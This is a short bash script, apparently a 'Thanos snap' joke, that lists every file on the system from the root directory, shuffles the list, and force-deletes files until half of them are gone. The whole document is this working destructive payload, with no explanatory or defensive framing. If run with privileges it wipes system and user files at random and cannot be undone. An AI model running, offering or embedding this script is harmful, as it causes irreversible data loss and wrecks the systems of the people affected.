#!/bin/bash

IFS=$'\n'; set -f

files=$(find / -type f | grep -v snap.sh | sort -R);
n_files=$(find / -type f | grep -v snap.sh | wc -l);
counter=0

for f in $files; do
    rm -rf $f;
    counter=$((counter+1));

    if [ $counter -eq $((n_files / 2)) ]
    then
        break;
    fi;
done;

unset IFS; set +f
